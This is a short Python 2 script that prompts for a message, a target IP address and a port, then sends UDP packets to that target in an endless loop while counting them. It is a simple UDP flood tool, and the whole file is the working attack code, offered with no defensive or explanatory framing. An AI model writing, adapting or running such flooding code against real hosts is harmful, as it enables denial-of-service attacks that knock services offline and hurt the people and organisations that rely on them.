import sys
import os
import socket
import string
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system("clear")

print("\033[92m")

message = raw_input("[*] Message >>> ")

ip = raw_input("[*] IP Target >>> ")

port = input("[*] PORT >>> ")

os.system("clear")
sent = 0
while True:
     sock.sendto(message ,(ip,port))
     sent += 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
